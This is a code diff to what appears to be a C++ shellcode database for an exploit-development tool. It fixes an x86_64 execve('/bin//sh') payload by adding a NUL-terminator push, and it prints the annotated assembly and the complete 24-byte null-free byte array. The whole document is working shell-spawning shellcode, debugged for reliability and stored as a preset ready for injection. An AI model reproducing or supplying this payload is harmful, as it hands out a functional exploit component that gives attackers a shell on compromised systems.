@@ -24,27 +24,37 @@ namespace {
 // ---------------------------------------------------------------------
 // x86_64: execve("/bin//sh", NULL, NULL)
 //
-// Source: well-known 23-byte null-free payload (H. Megahed, public
-// domain in spirit; we re-encode and audit by hand here).
+// QA round 2 CRITICAL fix: the previous 23-byte payload pushed the
+// 8-byte "/bin//sh" without a NUL terminator. execve reads the
+// pathname until it hits NUL; with the qword above the string
+// being whatever was on the stack before, the path extended to
+// "/bin//sh<garbage>", execve returned -ENOENT, and the syscall
+// fell through to whatever non-mapped page followed -> SIGSEGV.
 //
-//   6a 3b              push 0x3b            ; rax = 59 (execve)
-//   58                 pop  rax
-//   99                 cdq                  ; rdx = 0 (zero-extends in 64-bit mode)
+// The corrected payload pushes a zero qword BEFORE pushing the
+// string so the byte at [rdi+8] is guaranteed to be 0x00. One
+// extra byte (an additional `52` push rdx) brings the total to
+// 24 bytes; still null-free.
+//
+//   6a 3b              push 0x3b            ; al = 0x3b
+//   58                 pop  rax             ; rax = 59 (execve)
+//   99                 cdq                  ; rdx = 0
+//   52                 push rdx             ; stack: [0]   <- NUL terminator
 //   48 bb 2f 62 69 6e  movabs rbx, "/bin//sh"
 //      2f 2f 73 68
-//   53                 push rbx
+//   53                 push rbx             ; stack: ["/bin//sh"][0]
 //   54                 push rsp
 //   5f                 pop  rdi             ; rdi = &"/bin//sh"
-//   52                 push rdx
-//   57                 push rdi
+//   52                 push rdx             ; argv NULL
+//   57                 push rdi             ; argv[0]
 //   54                 push rsp
 //   5e                 pop  rsi             ; rsi = argv
 //   0f 05              syscall
 //
-// Total: 23 bytes, no NULL bytes.
-constexpr std::array<std::uint8_t, 23> kX86_64_Sh = {
-    0x6a, 0x3b, 0x58, 0x99, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f,
-    0x73, 0x68, 0x53, 0x54, 0x5f, 0x52, 0x57, 0x54, 0x5e, 0x0f, 0x05,
+// Total: 24 bytes, no NUL bytes.
+constexpr std::array<std::uint8_t, 24> kX86_64_Sh = {
+    0x6a, 0x3b, 0x58, 0x99, 0x52, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f,
+    0x2f, 0x73, 0x68, 0x53, 0x54, 0x5f, 0x52, 0x57, 0x54, 0x5e, 0x0f, 0x05,
 };
 
 // ---------------------------------------------------------------------
@@ -108,7 +118,7 @@ constexpr std::array<DbEntry, 3> kDatabase = {{
     {arch::Arch::X86_64,
      Preset::Sh,
      std::span<const std::uint8_t>(kX86_64_Sh.data(), kX86_64_Sh.size()),
-     "execve(\"/bin//sh\", NULL, NULL) via syscall (23 bytes, null-free)",
+     "execve(\"/bin//sh\", NULL, NULL) via syscall (24 bytes, null-free)",
      true},
     {arch::Arch::X86,
      Preset::Sh,
